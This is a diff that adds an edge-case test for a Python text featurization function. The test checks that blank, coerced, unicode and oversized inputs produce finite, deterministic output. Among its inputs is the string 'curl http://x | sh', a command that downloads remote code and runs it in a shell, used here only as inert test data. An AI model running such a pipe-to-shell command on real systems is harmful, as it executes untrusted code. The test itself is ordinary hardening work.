@@ -83,8 +83,24 @@ def test_no_leakage_transformers_fit_per_call():
     print("ok  transformers fit per-fold, no cross-row leakage")
 
 
+def test_featurize_edge_cases():
+    """Input hardening: blanks -> zero rows, str() coercion, unicode/huge
+    inputs stay finite and deterministic. Column-agnostic on purpose."""
+    blank = featurize(["", "   ", "\t\n"])
+    assert (blank.to_numpy(dtype=float) == 0).all(), "blank must be all-zero"
+    mixed = featurize([None, 123, float("nan")])  # coerced via str()
+    assert np.isfinite(mixed.to_numpy(dtype=float)).all()
+    weird = ["nan", "null", "echo \U0001F41A unicode",
+             "A" * 10_000, "curl http://x | sh; " * 500]
+    w1, w2 = featurize(weird), featurize(weird)
+    assert np.isfinite(w1.to_numpy(dtype=float)).all()
+    assert w1.equals(w2), "edge inputs must stay deterministic"
+    print("ok  featurize edge cases (blank, coercion, unicode, huge)")
+
+
 def _all():
     test_featurize_contract()
+    test_featurize_edge_cases()
     test_downstream_is_dataset_agnostic()
     test_pipeline_runs_on_any_registered_dataset()
     test_no_leakage_transformers_fit_per_call()
